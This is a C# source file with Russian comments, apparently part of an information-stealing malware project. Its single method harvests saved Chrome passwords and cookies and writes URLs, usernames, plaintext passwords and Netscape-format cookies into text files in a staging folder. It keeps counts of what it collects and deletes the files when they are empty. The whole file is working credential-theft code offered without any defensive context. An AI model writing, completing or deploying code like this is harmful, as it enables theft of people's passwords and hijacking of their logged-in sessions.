using System;
using System.IO;
using System.Threading.Tasks;
using SHARP;

public class YandexProcessor
{







    public static async Task ProcessChromeDataAsync()
    {
        int pups = 0;
        string yandexDirectory = Path.Combine(Help.pupsdir, "Chrome");
        if (!Directory.Exists(yandexDirectory))
        {
            Directory.CreateDirectory(yandexDirectory);
        }

        // Получаем пароли
        var passwords = await Chrome.GetPasswords();

        // Записываем пароли в файл
        string passwordsFilePath = Path.Combine(yandexDirectory, "Passwords.txt");
        using (StreamWriter passwordWriter = new StreamWriter(passwordsFilePath))
        {
            foreach (var password in passwords)
            {
                await passwordWriter.WriteLineAsync($"URL: {password.Url}\nUsername: {password.Username}\nPassword: {password.Password}\r\n");
                Counting.Passwords++;
            }
        }

        // Проверяем и удаляем пустой файл паролей
        FileInfo passwordsFile = new FileInfo(passwordsFilePath);
        if (passwordsFile.Length == 0)
        {
            File.Delete(passwordsFilePath);
            Console.WriteLine($"Empty passwords file deleted.");
            pups++;
        }
        else
        {
            Console.WriteLine($"Passwords written to: {passwordsFilePath}");
        }

        // Получаем куки
        var cookies = await Chrome.GetCookies();

        // Записываем куки в файл
        string cookiesFilePath = Path.Combine(yandexDirectory, "Cookies.txt");
        using (StreamWriter cookieWriter = new StreamWriter(cookiesFilePath))
        {
            foreach (var cookie in cookies)
            {
                await cookieWriter.WriteLineAsync($"{cookie.Host}\tTRUE\t{cookie.Path}\tFALSE\t{cookie.Expiry}\t{cookie.Name}\t{cookie.Cookie}\r\n");
                Counting.Cookies++;
            }
        }

        // Проверяем и удаляем пустой файл куков
        FileInfo cookiesFile = new FileInfo(cookiesFilePath);
        if (cookiesFile.Length == 0)
        {
            File.Delete(cookiesFilePath);
            Console.WriteLine($"Empty cookies file deleted.");
            pups++;
        }
        else
        {
            Console.WriteLine($"Cookies written to: {cookiesFilePath}");
        }


        if (pups == 2)
        {
            Directory.Delete(yandexDirectory, true);
        }
    }




}